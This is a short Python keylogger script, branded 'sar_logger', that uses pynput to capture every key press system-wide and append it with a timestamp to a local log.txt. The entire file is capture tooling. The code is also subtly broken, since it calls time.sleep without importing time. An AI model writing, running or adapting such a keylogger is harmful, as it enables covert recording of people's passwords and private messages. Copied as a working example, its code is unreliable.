from pynput import keyboard
import datetime

ascii_code = '''
 -----------------------------------------@utsr_---------------------------------------
/  _|      _|  _|      _|  _|      _|  _|_|_|_|_|   _|_|_|_|_|  _|_|_|_|_|  _|_|_|     /
/  _|      _|  _|_|  _|_|  _|      _|      _|       _|          _|      _|  _|    _|   /
/  _|      _|  _|  _|  _|  _|      _|      _|       _|_|_|_|_|  _|_|_|_|_|  _|_|_|_|   /
/  _|      _|  _|      _|  _|      _|      _|               _|  _|      _|  _|  _|     /
/  _|_|_|_|_|  _|      _|  _|_|_|_|_|      _|       _|_|_|_|_|  _|      _|  _|    _|   /
/                                                       _|                             /
 -----------------------------------CREATED BY UMUT SAR-------------------------------

              *************************sar_logger*************************
'''
def show_ascii_art(art):
    for line in art.splitlines():
        print(line)
        time.sleep(0.05)

show_ascii_art(ascii_code)
print("Welcome to sar_logger. You can see key logs with log.txt...")
def on_key_press(key):
    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        else:
            char = f"[{key}]"
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a") as f:
        f.write(f"\n{timestamp} {char}")  # Her program başladığında tarih ve saat bilgisi ile bir alt satıra inip karakteri ekler

def on_key_release(key):
    pass

keyboard_listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
keyboard_listener.start()

keyboard_listener.join()
